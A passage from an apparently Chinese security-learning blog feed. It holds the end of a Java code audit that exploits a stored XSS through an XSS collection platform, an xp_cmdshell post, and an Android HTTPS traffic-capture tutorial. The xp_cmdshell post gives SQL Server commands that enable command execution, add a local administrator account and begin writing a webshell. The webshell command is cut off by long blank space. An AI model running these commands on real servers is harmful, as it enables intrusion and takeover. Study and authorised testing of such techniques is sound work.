data-src="/../images/Java/jxc/image-20221128131010064.png" data-caption="image-20221128131010064"><img src="/../images/Java/jxc/image-20221128131010064.png" alt="image-20221128131010064"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130953106.png" data-caption="image-20221128130953106"><img src="/../images/Java/jxc/image-20221128130953106.png" alt="image-20221128130953106"></a></p><p>当我们使用其他账号登录，发现也能触发 XSS，证明该 XSS 为存储型 XSS</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131225694.png" data-caption="image-20221128131225694"><img src="/../images/Java/jxc/image-20221128131225694.png" alt="image-20221128131225694"></a></p><p>通过抓包找到该路由为 &#x2F;supplier&#x2F;list</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131433784.png" data-caption="image-20221128131433784"><img src="/../images/Java/jxc/image-20221128131433784.png" alt="image-20221128131433784"></a></p><p>IDEA 全局搜索定位到 Controller 层 <code>SupplierController.java</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131630406.png" data-caption="image-20221128131630406"><img src="/../images/Java/jxc/image-20221128131630406.png" alt="image-20221128131630406"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128131818693.png" data-caption="image-20221128131818693"><img src="/../images/Java/jxc/image-20221128131818693.png" alt="image-20221128131818693"></a></p><p>通过对比，参数 page、rows 对应 Burp 抓到到参数基本一致，确定为该路径</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132127301.png" data-caption="image-20221128132127301"><img src="/../images/Java/jxc/image-20221128132127301.png" alt="image-20221128132127301"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132225563.png" data-caption="image-20221128132225563"><img src="/../images/Java/jxc/image-20221128132225563.png" alt="image-20221128132225563"></a></p><p><code>Ctrl + 鼠标左键</code> 跟进 list 方法，我们来到了 Service 层的 <code>SupplierService.java</code>,定位到 <code>SupplierService</code> 接口</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132450975.png" data-caption="image-20221128132450975"><img src="/../images/Java/jxc/image-20221128132450975.png" alt="image-20221128132450975"></a></p><p><code>Ctrl + 鼠标左键</code> 进行跟进该接口，找到具体实现代码位置为 <code>SupplierServiceImpl.java</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132721752.png" data-caption="image-20221128132721752"><img src="/../images/Java/jxc/image-20221128132721752.png" alt="image-20221128132721752"></a></p><p>代码逻辑清晰，没有对输入进行过滤</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132640798.png" data-caption="image-20221128132640798"><img src="/../images/Java/jxc/image-20221128132640798.png" alt="image-20221128132640798"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128132902071.png" data-caption="image-20221128132902071"><img src="/../images/Java/jxc/image-20221128132902071.png" alt="image-20221128132902071"></a></p><p>XSS实战中的使用,使用 XSS 平台，创建一个项目</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141001324.png" data-caption="image-20221128141001324"><img src="/../images/Java/jxc/image-20221128141001324.png" alt="image-20221128141001324"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141022057.png" data-caption="image-20221128141022057"><img src="/../images/Java/jxc/image-20221128141022057.png" alt="image-20221128141022057"></a></p><p>这里选择默认模块</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141043009.png" data-caption="image-20221128141043009"><img src="/../images/Java/jxc/image-20221128141043009.png" alt="image-20221128141043009"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128133535652.png" data-caption="image-20221128133535652"><img src="/../images/Java/jxc/image-20221128133535652.png" alt="image-20221128133535652"></a></p><p>随便选择一个代码插入到存在漏洞的框框中</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128141147400.png" data-caption="image-20221128141147400"><img src="/../images/Java/jxc/image-20221128141147400.png" alt="image-20221128141147400"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128133858249.png" data-caption="image-20221128133858249"><img src="/../images/Java/jxc/image-20221128133858249.png" alt="image-20221128133858249"></a></p><p>返回 XSS 平台这里已经返回部分信息</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128133752931.png" data-caption="image-20221128133752931"><img src="/../images/Java/jxc/image-20221128133752931.png" alt="image-20221128133752931"></a></p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>这次项目审计进一步了解 Shiro 登录认证机制，再通过审计功能点进一步了解审计基础，审计的漏洞数量虽然不多，但加深了审计的技巧。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/283810.html</span><br><span class="line">https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw</span><br><span class="line">https://www.bilibili.com/video/BV1R24y1f7PY/?spm_id_from=333.999.0.0&amp;vd_source=193491f7ce412a6c60a101325cdd0aa0</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞系列-MSSQL提权之xp_cmdshell</title>
      <link href="/2022/11/26/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-MSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bxp_cmdshell/"/>
      <url>/2022/11/26/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-MSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bxp_cmdshell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p><code>xp_cmdshell</code> 是 Microsoft SQL Server 中的一个系统存储过程，允许从SQL查询中执行操作系统命令。它在之前的SQL Server版本中可用，从SQL Server 2012开始被弃用。提权前提</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getshell 或者存在 sql 注入并且能够执行命令（sqlmap sql-shell）。</span><br><span class="line">sql server 是 system 权限（sql server 默认就是 system 权限）。</span><br></pre></td></tr></table></figure></div><h2 id="二、xp-cmdshell-相关命令"><a href="#二、xp-cmdshell-相关命令" class="headerlink" title="二、xp_cmdshell 相关命令"></a>二、xp_cmdshell 相关命令</h2><p>有了 xp_cmdshell 的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p><br/><h3 id="开启-xp-cmdshell"><a href="#开启-xp-cmdshell" class="headerlink" title="开启 xp_cmdshell"></a>开启 xp_cmdshell</h3><p>可在 sqlmap 获取 sql-shell 后执行命令，原理就是利用 sp_configure 进行执行命令。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;</span><br></pre></td></tr></table></figure></div><br/><h3 id="关闭-xp-cmdshell"><a href="#关闭-xp-cmdshell" class="headerlink" title="关闭 xp_cmdshell"></a>关闭 xp_cmdshell</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure</span><br></pre></td></tr></table></figure></div><br/><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;net user test pinohd123. /add&#x27;    添加用户test，密码test</span><br><span class="line">exec master..xp_cmdshell &#x27;net localgroup administrators test /add&#x27;    添加test用户到管理员组</span><br></pre></td></tr></table></figure></div><br/><h3 id="写入-webshell"><a href="#写入-webshell" class="headerlink" title="写入 webshell"></a>写入 webshell</h3><p>得知网站路径后，在 sql-shell 中执行写 shell，如果执行不了，可以尝试 hex 编码绕过，下面给出两个例子</p><p>&#96;&#96;&#96;<br>EXEC master..xp_cmdshell ‘echo ^&lt;%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 </p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> xp_cmdshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP测试系列-Android客户端流量抓包</title>
      <link href="/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/"/>
      <url>/2022/11/21/APP%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E6%8A%93%E5%8C%85-Android%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>众所周知，Android 从 7.0 开始，系统不再信任用户 CA 证书（应用 targetSdkVersion &gt;&#x3D; 24 时生效，如果 targetSdkVersion &lt; 24 即使系统是 7.0 + 依然会信任）。也就是说即使安装了用户 CA 证书，在 Android 7.0 + 的机器上，targetSdkVersion&gt;&#x3D; 24 的应用的 HTTPS 包就抓不到了。文章主要分为三大部分（注：请通读全文再选择合适自己的方法！）</p><h2 id="二、安卓模拟器抓包"><a href="#二、安卓模拟器抓包" class="headerlink" title="二、安卓模拟器抓包"></a>二、安卓模拟器抓包</h2><p>模拟器抓包的优点就是不需要真实的手机设备，电脑上下载个软件，设置相关配置就可以抓取 APP 流量。但缺点也很明显，模拟器的版本一般选择 Android 7.0 以下，若 APP 应用版本不支持在 Android 7.0 版本以下的手机安装则无法进行抓包，安装了 APP 打开了也只是闪退无法进入界面。模拟器具体抓包操作如下。</p><h3 id="1、安装模拟器"><a href="#1、安装模拟器" class="headerlink" title="1、安装模拟器"></a>1、安装模拟器</h3><p>电脑上安装安卓模拟器。个人平时测试喜欢使用 MuMu 模拟器，下载地址：<a href="https://adl.netease.com/d/g/a11/c/gw">https://adl.netease.com/d/g/a11/c/gw</a>  安装后界面如下，下图部分软件为本人自己安装的。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112145644738.png" data-caption="image-20221112145644738"><img src="/../images/app/Packet_capture/image-20221112145644738.png" alt="image-20221112145644738"></a></p><h3 id="2、配置证书"><a href="#2、配置证书" class="headerlink" title="2、配置证书"></a>2、配置证书</h3><p>想要成功抓包，安装信任证书必不可少。Burp 开启监听，监听地址为连接 WIFI 后的本机 IP，非 127.0.0.1</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112150053906.png" data-caption="image-20221112150053906"><img src="/../images/app/Packet_capture/image-20221112150053906.png" alt="image-20221112150053906"></a></p><p>Burp 中设置监听代理为本机 IP </p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112150945417.png" data-caption="image-20221112150945417"><img src="/../images/app/Packet_capture/image-20221112150945417.png" alt="image-20221112150945417"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112151153064.png" data-caption="image-20221112151153064"><img src="/../images/app/Packet_capture/image-20221112151153064.png" alt="image-20221112151153064"></a></p><p>将 Burp 证书 安装到安卓模拟器中去，这里下载证书依然使用电脑浏览器下载，使用模拟器直接下载个人感觉不太好操作。浏览器设置 192.168.1.102:9000 代理。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112151340657.png" data-caption="image-20221112151340657"><img src="/../images/app/Packet_capture/image-20221112151340657.png" alt="image-20221112151340657"></a></p><p>访问 <a href="http://192.168.1.102:9000/">http://192.168.1.102:9000</a>  ，下载CA 证书，下载后证书名为 cacert.der，我们需要将其证书名后缀改为 .cer 然后安装到安卓模拟器中，即 cacert.cer</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221113164208412.png" data-caption="image-20221113164208412"><img src="/../images/app/Packet_capture/image-20221113164208412.png" alt="image-20221113164208412"></a></p><p>安装详细步骤如下：</p><p>打开模拟器文件共享文件夹，把 CA 证书拉取进去</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112151943004.png" data-caption="image-20221112151943004"><img src="/../images/app/Packet_capture/image-20221112151943004.png" alt="image-20221112151943004"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152233341.png" data-caption="image-20221112152233341"><img src="/../images/app/Packet_capture/image-20221112152233341.png" alt="image-20221112152233341"></a></p><p>打开文件管理器，进入 $MuMu共享文件夹找到该证书点击进行安装</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152423683.png" data-caption="image-20221112152423683"><img src="/../images/app/Packet_capture/image-20221112152423683.png" alt="image-20221112152423683"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152437313.png" data-caption="image-20221112152437313"><img src="/../images/app/Packet_capture/image-20221112152437313.png" alt="image-20221112152437313"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152450976.png" data-caption="image-20221112152450976"><img src="/../images/app/Packet_capture/image-20221112152450976.png" alt="image-20221112152450976"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152511065.png" data-caption="image-20221112152511065"><img src="/../images/app/Packet_capture/image-20221112152511065.png" alt="image-20221112152511065"></a></p><h3 id="3、配置代理"><a href="#3、配置代理" class="headerlink" title="3、配置代理"></a>3、配置代理</h3><p>⚠️ 注意，APP抓包无论是模拟器还是真机，连接的网络必须是同一WIFI，所以 Burp 监听才会设置为本机 IP，而非 127.0.0.1。上面已经配置好 Burp 抓包所需配置，下面我们只需要配置模拟器代理即可进行抓包。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152907673.png" data-caption="image-20221112152907673"><img src="/../images/app/Packet_capture/image-20221112152907673.png" alt="image-20221112152907673"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112152944897.png" data-caption="image-20221112152944897"><img src="/../images/app/Packet_capture/image-20221112152944897.png" alt="image-20221112152944897"></a></p><p>配置网络与 Burp 代理一致</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112153028958.png" data-caption="image-20221112153028958"><img src="/../images/app/Packet_capture/image-20221112153028958.png" alt="image-20221112153028958"></a></p><p>这里随便打开一个软件，成功抓取到 https 流量</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112153433552.png" data-caption="image-20221112153433552"><img src="/../images/app/Packet_capture/image-20221112153433552.png" alt="image-20221112153433552"></a></p><p>对了，模拟器如何安装 app 也简单说一下，可以通过模拟器应用商店直接下载，也可以电脑上获取 apk 包后直接拉进去模拟器进行安装,模拟器底部也有个 APK 安装的选项。</p><p>至此，模拟器抓取 APP 流量已经完成。</p><h3 id="4、小结"><a href="#4、小结" class="headerlink" title="4、小结"></a>4、小结</h3><p>模拟器进行 APP 流量抓取是最为简单有效的方法，本人工作中也是首选这一种，不行才转向真机测试。</p><h2 id="三、安卓真机抓包"><a href="#三、安卓真机抓包" class="headerlink" title="三、安卓真机抓包"></a>三、安卓真机抓包</h2><h3 id="1、手机-ROOT（小米）"><a href="#1、手机-ROOT（小米）" class="headerlink" title="1、手机 ROOT（小米）"></a>1、手机 ROOT（小米）</h3><p>手机需要 ROOT（经实测有些 APP 无需 ROOT 也可以抓取到，安装 CA 证书即可，自己按实际情况去测试是否可行），本人使用的是小米 MIX 2s 作为日常的测试机，通过官方解锁。参考视频：<a href="https://www.bilibili.com/video/BV1er4y1C7wU/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1er4y1C7wU/?spm_id_from=333.337.search-card.all.click</a> ，刷入面具（ROOT）教程：<a href="https://magiskcn.com/">https://magiskcn.com/</a></p><p>具体的刷 ROOT 这里就不展示了，参考视频已经非常详细了，其他机型自行探索。这里简单说一下刷入面具时遇到的一些小问题。在刷入面具时，手机进入 fastboot 后插入 USB 电脑无法识别设备是否插入，导致输入面具时告警：<code>&lt; waiting for any device &gt;</code></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171452091.png" data-caption="image-20221112171452091"><img src="/../images/app/Packet_capture/image-20221112171452091.png" alt="image-20221112171452091"></a></p><p>解决方案如下，手机进入 fastboot 模式，电脑插入连接手机的 USB 后，打开电脑设备管理器</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171645895.png" data-caption="image-20221112171645895"><img src="/../images/app/Packet_capture/image-20221112171645895.png" alt="image-20221112171645895"></a></p><p>选择其他设备-》鼠标右键更新驱动-》浏览我的电脑以查找驱动程序</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171755530.png" data-caption="image-20221112171755530"><img src="/../images/app/Packet_capture/image-20221112171755530.png" alt="image-20221112171755530"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112171819591.png" data-caption="image-20221112171819591"><img src="/../images/app/Packet_capture/image-20221112171819591.png" alt="image-20221112171819591"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172012733.png" data-caption="image-20221112172012733"><img src="/../images/app/Packet_capture/image-20221112172012733.png" alt="image-20221112172012733"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172044274.png" data-caption="image-20221112172044274"><img src="/../images/app/Packet_capture/image-20221112172044274.png" alt="image-20221112172044274"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172119508.png" data-caption="image-20221112172119508"><img src="/../images/app/Packet_capture/image-20221112172119508.png" alt="image-20221112172119508"></a></p><p>重新执行命令，成功刷入面具，即成功 ROOT，然后重启手机即可。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112172210871.png" data-caption="image-20221112172210871"><img src="/../images/app/Packet_capture/image-20221112172210871.png" alt="image-20221112172210871"></a></p><h3 id="2、Fiddle-抓包"><a href="#2、Fiddle-抓包" class="headerlink" title="2、Fiddle 抓包"></a>2、Fiddle 抓包</h3><p>Fiddler 下载链接：<a href="https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe">https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe</a></p><p>配置抓取 HTTPS 流量，Tools-》Options-》HTTPS</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112211747086.png" data-caption="image-20221112211747086"><img src="/../images/app/Packet_capture/image-20221112211747086.png" alt="image-20221112211747086"></a></p><p>勾选 HTTPS</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112211915851.png" data-caption="image-20221112211915851"><img src="/../images/app/Packet_capture/image-20221112211915851.png" alt="image-20221112211915851"></a></p><p>勾选后会弹出安装证书的提示，根据提示一直点击 是 安装即可。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112212110415.png" data-caption="image-20221112212110415"><img src="/../images/app/Packet_capture/image-20221112212110415.png" alt="image-20221112212110415"></a></p><p>配置代理端口 <code>Tools — Options — Connections</code>，端口选择 <code>9000</code>（可随意更改），勾选 <code>Allow remote computers to connect</code> ，点击 OK，重启 Fiddle 使配置生效</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112212121623.png" data-caption="image-20221112212121623"><img src="/../images/app/Packet_capture/image-20221112212121623.png" alt="image-20221112212121623"></a></p><p>配置手机端代理与 Fiddler 设置的端口一致，让 APP 流量走 Fiddler。这里手机也是同一 WIFI 下的本机 IP。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112212429801.png" data-caption="image-20221112212429801"><img src="/../images/app/Packet_capture/image-20221112212429801.png" alt="image-20221112212429801"></a></p><p>配置后，在手机浏览器访问上面设置的 IP 地址和端口号，我这里是 <code>192.168.1.102:9000</code>（这里要根据实际情况），然后 <code>FiddlerRoot certificate</code> 进行下载证书，并自行安装配置</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112213636603.png" data-caption="image-20221112213636603"><img src="/../images/app/Packet_capture/image-20221112213636603.png" alt="image-20221112213636603"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112213435342.png" data-caption="image-20221112213435342"><img src="/../images/app/Packet_capture/image-20221112213435342.png" alt="image-20221112213435342"></a></p><p>随便打开一个 APP 抓包成功</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121200703789.png" data-caption="image-20221121200703789"><img src="/../images/app/Packet_capture/image-20221121200703789.png" alt="image-20221121200703789"></a></p><h3 id="3、Fiddler-Burp-抓包"><a href="#3、Fiddler-Burp-抓包" class="headerlink" title="3、Fiddler + Burp 抓包"></a>3、Fiddler + Burp 抓包</h3><p>由于常年使用 Burp ，突然转到 Fiddler 会不习惯，所以我们再将 Fiddler 流量转发到 Burp 去，我们只需要在 Fiddler 抓包原有的基础上添加流量转发到 Burp 的配置即可。</p><p>Burp开启监听</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112220055883.png" data-caption="image-20221112220055883"><img src="/../images/app/Packet_capture/image-20221112220055883.png" alt="image-20221112220055883"></a></p><p>Fiddler 配置，<code>Tools-》Options-》Gateway-》Manual Proxy Configuration</code> 填写 127.0.0.1:8080 使与 Burp 的监听地址一致。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221112220244632.png" data-caption="image-20221112220244632"><img src="/../images/app/Packet_capture/image-20221112220244632.png" alt="image-20221112220244632"></a></p><p>APP 上点击功能点，流量从 Fiddler 转发到了 Burp，这样就比较直观了，回到熟悉的界面，也比较好操作。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121200547725.png" data-caption="image-20221121200547725"><img src="/../images/app/Packet_capture/image-20221121200547725.png" alt="image-20221121200547725"></a></p><p>Fiddler 真机抓包同样也可以应用在模拟器上，步骤相同。</p><h3 id="4、小结-1"><a href="#4、小结-1" class="headerlink" title="4、小结"></a>4、小结</h3><p>其实我们真机可以直接使用 Burp 抓取 App 的流量，只不过有时候由于使用 Burp 抓取的流量从 APP 回流到 Burp 的时间过长，导致 APP 显示无响应，所以我们使用 Fiddler 抓包，相对来说 Fiddler 对于 APP 和小程序的流量抓取会快一点，但由于 Fiddler 与 Burp 相比，功能上和操作上 Burp 又更胜一筹，所以我们就选择使用 Fiddler 抓取流量，然后把 Fiddler 的流量转发到 Burp 上，以达到更优的测试环境。<code>（Fiddler + Burpsuite 串联时 Fiddler 的流量走 Burpsuite 使 Burpsuite 没有了流量解析的过程，只是单纯将 Fiddler 流量转发到 Burpsuite，所以会比较快一点）</code></p><h2 id="四、扩展"><a href="#四、扩展" class="headerlink" title="四、扩展"></a>四、扩展</h2><h3 id="1、抓包工具无法抓取到流量，APP-可正常联网使用"><a href="#1、抓包工具无法抓取到流量，APP-可正常联网使用" class="headerlink" title="1、抓包工具无法抓取到流量，APP 可正常联网使用"></a>1、抓包工具无法抓取到流量，APP 可正常联网使用</h3><ul><li><p>APP 使用非 HTTP 协议，如 TCP、UDP 或者私有协议进行数据传输，所以无法通过常规手段进行抓包，需要进行逆向提取其算法进行分析研究。</p></li><li><p>APP 设置了不走系统代理的配置，导致无法通过系统代理将流量转发到抓包工具上，可通过第三方代理 APP， HttpCanary 进行流量抓取。</p></li></ul><p>根据网上资源收集了几个版本的 HTTPCannary ，<a href="https://l13144.lanzoul.com/b00peu2kh">请自行选取可用版本</a>。本人自己在没 ROOT 手机上选择了过检版成功抓取到应用流量。</p><p>安装步骤：</p><ul><li><p>手机上安装 HttpCanary 软件</p></li><li><p>安装证书</p></li></ul><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121203818209.png" data-caption="image-20221121203818209"><img src="/../images/app/Packet_capture/image-20221121203818209.png" alt="image-20221121203818209"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121203750042.png" data-caption="image-20221121203750042"><img src="/../images/app/Packet_capture/image-20221121203750042.png" alt="image-20221121203750042"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121203941186.png" data-caption="image-20221121203941186"><img src="/../images/app/Packet_capture/image-20221121203941186.png" alt="image-20221121203941186"></a></p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121204027908.png" data-caption="image-20221121204027908"><img src="/../images/app/Packet_capture/image-20221121204027908.png" alt="image-20221121204027908"></a></p><p>按照上面安装完成后，无需理会<code>安装根证书抓取SSL数据包</code>提示，点击右下角的小飞机变为绿色即开启抓包，打开APP即可抓取到数据包，根据自己需要进行测试，也可以将  HttpCanary 抓取到的流量包复制到Burp进行重放，就是有点麻烦，根据自身需求选择。</p><p><a data-fancybox="gallery" data-src="/../images/app/Packet_capture/image-20221121204554671.png" data-caption="image-20221121204554671"><img src="/../images/app/Packet_capture/image-20221121204554671.png" alt="image-20221121204554671"></a></p><h3 id="2、抓包工具无法抓取到流量，APP-无法正常联网使用"><a href="#2、抓包工具无法抓取到流量，APP-无法正常联网使用" class="headerlink" title="2、抓包工具无法抓取到流量，APP 无法正常联网使用"></a>2、抓包工具无法抓取到流量，APP 无法正常联网使用</h3><ul><li><p>当使用 Burp 或者 Fiddler 抓包时，无法抓取到流量包，手机上 APP 也无法正常使用。则考虑为证书信任问题，由于需要分析 HTTPS 流量，我们必定需要安装相应的抓包工具证书，而系统又对该证书无法信任，导致了无法抓取到流量，APP 也无法正常使用。</p></li><li><p>解决方案：</p><p>将用户证书安装到系统证书列表，我们安装证书一般在用户证书列表，我们将其移动到系统证书列表（此步骤需要 ROOT ，ROOT 后用户才能访问系统证书访问的目录），安装步骤如下：</p><p>1）转换证书格式</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 安装 openssl 转换证书的格式</span><br><span class="line">$ openssl x509 -in cacert.der -inform DER -out cacert.pem -outform PEM</span><br><span class="line">// 提取证书的hash</span><br><span class="line">$ openssl x509 -inform PEM -subject_hash -in cacert.pem</span><br><span class="line">// Linux 将证书转换格式,注意后缀为.0</span><br><span class="line">$ mv cacert.pem xxx.0</span><br></pre></td></tr></table></figure></div><p>使用adb将证书移入&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;目录下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 将证书导入 /data/local/tmp 目录</span><br><span class="line">$ adb push 7bf17d07.0 /data/local/tmp</span><br><span class="line">$ adb shell </span><br><span class="line">android:/ $ su</span><br><span class="line">android:/ # mount -o rw,remount / # 挂载/system目录</span><br><span class="line">android:/ # mv /data/local/tmp/xxx.0 /system/etc/security/cacerts/xxx.0 # 移动证书</span><br><span class="line">android:/ # chmod 644 /system/etc/security/cacerts/xxx.0 # 修改权限</span><br></pre></td></tr></table></figure></div><p>2）使用 Android 7.0 以下的手机，无需 ROOT ，即可尝试使用模拟器进行测试</p></li></ul><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>经过测试，有些 APP 流量，使用非 ROOT 手机也能通过 Burp 抓取到 HTTPS 流量，只需要安装 CA 证书即可。具体是否能成功得看 APP 证书验证即机制是否严格。抓包方式不局限与文章列举的方法，选择适合自己的方法才是最好的方法。</p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 